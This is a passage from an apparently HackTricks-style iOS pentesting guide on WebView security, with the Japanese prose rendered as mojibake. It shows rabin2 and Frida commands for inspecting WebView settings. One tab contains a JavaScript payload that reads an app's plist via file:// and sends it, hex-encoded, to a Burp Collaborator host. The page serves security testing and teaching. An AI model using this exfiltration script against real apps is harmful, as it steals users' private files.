# iOS WebViews

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã®[**GitHubãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã‚„[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>

## WebViewsã®ç¨®é¡

WebViewsã¯ã€ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ãª**web** **ã‚³ãƒ³ãƒ†ãƒ³ãƒ„**ã‚’è¡¨ç¤ºã™ã‚‹ãŸã‚ã®ã‚¢ãƒ—ãƒªå†…ãƒ–ãƒ©ã‚¦ã‚¶ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã™ã€‚ã“ã‚Œã‚‰ã¯ã€webã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ã‚¢ãƒ—ãƒªã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã«ç›´æ¥åŸ‹ã‚è¾¼ã‚€ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚iOS WebViewsã¯**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§** **JavaScript**ã®å®Ÿè¡Œã‚’**ã‚µãƒãƒ¼ãƒˆ**ã—ã¦ã„ã‚‹ãŸã‚ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®æ³¨å…¥ã‚„ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°æ”»æ’ƒã®å½±éŸ¿ã‚’å—ã‘ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** UIWebViewã¯iOS 12ã‹ã‚‰éæ¨å¥¨ã¨ãªã£ã¦ãŠã‚Šã€ä½¿ç”¨ã™ã¹ãã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚**JavaScriptã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview): ã‚¢ãƒ—ãƒªæ©Ÿèƒ½ã®æ‹¡å¼µã€è¡¨ç¤ºã•ã‚Œã‚‹ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®åˆ¶å¾¡ã«é©ã—ãŸé¸æŠã§ã™ã€‚
* **JavaScript**ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœ‰åŠ¹ã§ã™ãŒã€`WKWebView`ã®**`javaScriptEnabled`**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã«ã‚ˆã‚Šã€**å®Œå…¨ã«ç„¡åŠ¹åŒ–ã™ã‚‹ã“ã¨ãŒã§ã**ã€ã™ã¹ã¦ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆæ³¨å…¥ã®æ¬ é™¥ã‚’é˜²ãã“ã¨ãŒã§ãã¾ã™ã€‚
* **`JavaScriptCanOpenWindowsAutomatically`**ã¯ã€JavaScriptãŒæ–°ã—ã„ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ï¼ˆä¾‹ãˆã°ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ï¼‰ã‚’**é–‹ãã®ã‚’é˜²ã**ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚
* **`hasOnlySecureContent`**ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã¯ã€WebViewã«ã‚ˆã£ã¦ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ãƒªã‚½ãƒ¼ã‚¹ãŒæš—å·åŒ–ã•ã‚ŒãŸæ¥ç¶šã‚’é€šã˜ã¦å–å¾—ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚
* `WKWebView`ã¯ãƒ—ãƒ­ã‚»ã‚¹å¤–ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚’å®Ÿè£…ã—ã¦ã„ã‚‹ãŸã‚ã€**ãƒ¡ãƒ¢ãƒªç ´æãƒã‚°ãŒ**ãƒ¡ã‚¤ãƒ³ã‚¢ãƒ—ãƒªãƒ—ãƒ­ã‚»ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ã“ã¨ã¯**ã‚ã‚Šã¾ã›ã‚“**ã€‚
*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** **ä¸€èˆ¬çš„ãªwebãƒ“ãƒ¥ãƒ¼ã‚¤ãƒ³ã‚°ä½“é¨“**ã‚’æä¾›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã¹ãã§ã™ã€‚ã“ã‚Œã‚‰ã®WebViewsã¯ã€ä»¥ä¸‹ã®è¦ç´ ã‚’å«ã‚€ç‰¹å¾´çš„ãªãƒ¬ã‚¤ã‚¢ã‚¦ãƒˆã‚’æŒã£ã¦ã„ã‚‹ãŸã‚ã€ç°¡å˜ã«è¦‹åˆ†ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

* èª­ã¿å–ã‚Šå°‚ç”¨ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ³ã‚¸ã‚±ãƒ¼ã‚¿ãƒ¼ã€‚
* ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ï¼ˆ"**å…±æœ‰**"ï¼‰**ãƒœã‚¿ãƒ³**ã€‚
* **å®Œäº†ãƒœã‚¿ãƒ³**ã€æˆ»ã‚‹ã¨é€²ã‚€ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ãƒœã‚¿ãƒ³ã€ãŠã‚ˆã³Safariã§ç›´æ¥ãƒšãƒ¼ã‚¸ã‚’é–‹ããŸã‚ã®"Safari"ãƒœã‚¿ãƒ³ã€‚

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* `SFSafariViewController`ã§ã¯**JavaScriptã‚’ç„¡åŠ¹ã«ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ã€‚ã“ã‚Œã¯ã€ã‚¢ãƒ—ãƒªã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’æ‹¡å¼µã™ã‚‹ç›®çš„ã§`WKWebView`ã®ä½¿ç”¨ãŒæ¨å¥¨ã•ã‚Œã‚‹ç†ç”±ã®ä¸€ã¤ã§ã™ã€‚
* `SFSafariViewController`ã¯ã¾ãŸã€**Safari**ã¨ã‚¯ãƒƒã‚­ãƒ¼ã‚„ä»–ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãƒ‡ãƒ¼ã‚¿ã‚’**å…±æœ‰ã—ã¾ã™**ã€‚
* `SFSafariViewController`ã§ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ´»å‹•ã‚„ç›¸äº’ä½œç”¨ã¯ã‚¢ãƒ—ãƒªã«ã¯**è¦‹ãˆã¾ã›ã‚“**ã€‚ã‚¢ãƒ—ãƒªã¯ã‚ªãƒ¼ãƒˆãƒ•ã‚£ãƒ«ãƒ‡ãƒ¼ã‚¿ã€ãƒ–ãƒ©ã‚¦ã‚¸ãƒ³ã‚°å±¥æ­´ã€ã¾ãŸã¯ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚
* App Store Review Guidelinesã«ã‚ˆã‚‹ã¨ã€`SFSafariViewController`ã¯ä»–ã®ãƒ“ãƒ¥ãƒ¼ã‚„ãƒ¬ã‚¤ãƒ¤ãƒ¼ã«ã‚ˆã£ã¦**éš ã•ã‚ŒãŸã‚Šã€è¦†ã„éš ã•ã‚ŒãŸã‚Šã—ã¦ã¯ãªã‚Šã¾ã›ã‚“**ã€‚

## WebViewsã®è¨­å®šã‚’ç™ºè¦‹ã™ã‚‹

### é™çš„è§£æ

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
WebViewã‚¯ãƒ©ã‚¹ã®æ—¢çŸ¥ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€WKWebViewã‚’åˆæœŸåŒ–ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ¡ã‚½ãƒƒãƒ‰([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init))ã‚’æ¤œç´¢ã—ã¾ã™ï¼š
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### JavaScriptã®è¨­å®šã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹

`WKWebView`ã«ãŠã„ã¦ã€ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã¨ã—ã¦ã€JavaScriptã¯æ˜ç¤ºçš„ã«å¿…è¦ãªå ´åˆã‚’é™¤ãç„¡åŠ¹ã«ã™ã¹ãã§ã™ã€‚JavaScriptãŒé©åˆ‡ã«ç„¡åŠ¹ã«ã•ã‚Œã¦ã„ã‚‹ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã§`WKPreferences`ã®ä½¿ç”¨ç®‡æ‰€ã‚’æ¤œç´¢ã—ã€[`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled)ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ãŒ`false`ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¾ã™ï¼š
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã®ã¿ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã‚’æ¤œç´¢ã§ãã¾ã™ï¼š
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### OnlySecureContentã®ãƒ†ã‚¹ãƒˆ

`UIWebView`ã¨ã¯å¯¾ç…§çš„ã«ã€`WKWebView`ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€[æ··åœ¨ã‚³ãƒ³ãƒ†ãƒ³ãƒ„](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en)ï¼ˆHTTPSãƒšãƒ¼ã‚¸ã‹ã‚‰ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸHTTPã‚³ãƒ³ãƒ†ãƒ³ãƒ„ï¼‰ã‚’æ¤œå‡ºã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚[`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent)ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€ãƒšãƒ¼ã‚¸ä¸Šã®ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ãŒå®‰å…¨ã«æš—å·åŒ–ã•ã‚ŒãŸæ¥ç¶šã‚’é€šã˜ã¦ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸã‹ã©ã†ã‹ã‚’æ¤œè¨¼ã§ãã¾ã™ã€‚\
ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªå†…ã§ï¼š
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚„æ–‡å­—åˆ—å†…ã§ "http:// "ã¨ã„ã†æ–‡å­—åˆ—ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã—ã‹ã—ã€ã“ã‚Œã¯å¿…ãšã—ã‚‚æ··åœ¨ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®å•é¡ŒãŒã‚ã‚‹ã¨ã¯é™ã‚Šã¾ã›ã‚“ã€‚æ··åœ¨ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€[MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content)ã§å­¦ã¶ã“ã¨ãŒã§ãã¾ã™ã€‚

### å‹•çš„åˆ†æ

`ObjC.choose()` ã‚’ä½¿ç”¨ã—ã¦ãƒ’ãƒ¼ãƒ—ã‚’æ¤œæŸ»ã—ã€ç•°ãªã‚‹ã‚¿ã‚¤ãƒ—ã®WebViewsã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ `javaScriptEnabled` ã¨ `hasonlysecurecontent` ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼š

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
```
Load it with:
```
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## WebView ãƒ—ãƒ­ãƒˆã‚³ãƒ«å‡¦ç†

iOSã®WebViewã§è§£é‡ˆã•ã‚Œã‚‹ã„ãã¤ã‹ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚¹ã‚­ãƒ¼ãƒ ãŒã‚ã‚Šã¾ã™ã€‚ä¾‹ãˆã°ï¼š

* http(s)://
* file://
* tel://

WebViewã¯ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‹ã‚‰ãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ã‚¢ãƒ—ãƒªãƒ‡ãƒ¼ã‚¿ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‹ã‚‰ãƒ­ãƒ¼ã‚«ãƒ«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ãƒ­ãƒ¼ã‚«ãƒ«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ•ã‚¡ã‚¤ãƒ«åã‚„ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹ãƒ‘ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã§ããšã€ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç·¨é›†ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã›ã‚“ã€‚

### WebView ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®ãƒ­ãƒ¼ãƒ‰

* **UIWebView**: éæ¨å¥¨ã®ãƒ¡ã‚½ãƒƒãƒ‰ [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) ã¾ãŸã¯ [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) ã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚
* **WKWebView**: ãƒ¡ã‚½ãƒƒãƒ‰ [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) ã¾ãŸã¯ [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) ã‚’ä½¿ç”¨ã—ã¦ãƒ­ãƒ¼ã‚«ãƒ«HTMLãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã€`loadRequest:` ã‚’ä½¿ç”¨ã—ã¦Webã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚é€šå¸¸ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã¯ [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource)ã€[`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc)ã€[`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init) ãªã©ã®ãƒ¡ã‚½ãƒƒãƒ‰ã¨çµ„ã¿åˆã‚ã›ã¦ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¾ã™ã€‚ã•ã‚‰ã«ã€ã‚¢ãƒ—ãƒªãŒãƒ¡ã‚½ãƒƒãƒ‰ [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc) ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚‚ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã®æœ€åˆã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ `URL` ã§ã€WebViewã«ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹URLã‚’å«ã¿ã€2ç•ªç›®ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ `allowingReadAccessToURL` ã¯å˜ä¸€ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¾ãŸã¯ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å«ã‚€ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚å˜ä¸€ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å«ã‚€å ´åˆã€ãã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯WebViewã§åˆ©ç”¨å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ã—ã‹ã—ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’å«ã‚€å ´åˆã€ãã®**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå†…ã®ã™ã¹ã¦ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒWebViewã§åˆ©ç”¨å¯èƒ½ã«ãªã‚Šã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€ã“ã‚Œã‚’æ¤œæŸ»ã—ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®å ´åˆã¯ã€ãã®ä¸­ã«æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ãŒå«ã¾ã‚Œã¦ã„ãªã„ã‹ã‚’ç¢ºèªã™ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚

ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã‚‰ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ¤œç´¢ã§ãã¾ã™ã€‚**ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚ŒãŸ** **ãƒã‚¤ãƒŠãƒª**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã‚‚ã€ã“ã‚Œã‚‰ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ¤œç´¢ã§ãã¾ã™ã€‚
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ã‚¯ã‚»ã‚¹

* **UIWebView:**
* `file://` ã‚¹ã‚­ãƒ¼ãƒ ã¯å¸¸ã«æœ‰åŠ¹ã§ã™ã€‚
* `file://` URLã‹ã‚‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ã‚¯ã‚»ã‚¹ã¯å¸¸ã«æœ‰åŠ¹ã§ã™ã€‚
* `file://` URLã‹ã‚‰ã®ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ã‚¢ã‚¯ã‚»ã‚¹ã¯å¸¸ã«æœ‰åŠ¹ã§ã™ã€‚
* `baseURL` ã‚‚ `nil` ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹ `UIWebView` ã‹ã‚‰æœ‰åŠ¹ãªã‚ªãƒªã‚¸ãƒ³ã‚’å–å¾—ã™ã‚‹ã¨ã€**"null"ã«è¨­å®šã•ã‚Œã¦ã„ãªã„**ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ä»£ã‚ã‚Šã«ã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ãŒå¾—ã‚‰ã‚Œã¾ã™: `applewebdata://5361016c-f4a0-4305-816b-65411fc1d780`ã€‚ã“ã®ã‚ªãƒªã‚¸ãƒ³ "applewebdata://" ã¯ "file://" ã‚ªãƒªã‚¸ãƒ³ã¨ä¼¼ã¦ãŠã‚Šã€**Same-Origin Policyã‚’å®Ÿè£…ã—ã¦ã„ãªã„**ãŸã‚ã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ä»»æ„ã®ã‚¦ã‚§ãƒ–ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’è¨±å¯ã—ã¾ã™ã€‚

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
* **`allowFileAccessFromFileURLs`** (`WKPreferences`, ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`false`): `file://`ã‚¹ã‚­ãƒ¼ãƒ URLã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§å®Ÿè¡Œã•ã‚Œã‚‹JavaScriptãŒã€ä»–ã®`file://`ã‚¹ã‚­ãƒ¼ãƒ URLã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
* **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯`false`): `file://`ã‚¹ã‚­ãƒ¼ãƒ URLã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§å®Ÿè¡Œã•ã‚Œã‚‹JavaScriptãŒã€ä»»æ„ã®ã‚ªãƒªã‚¸ãƒ³ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

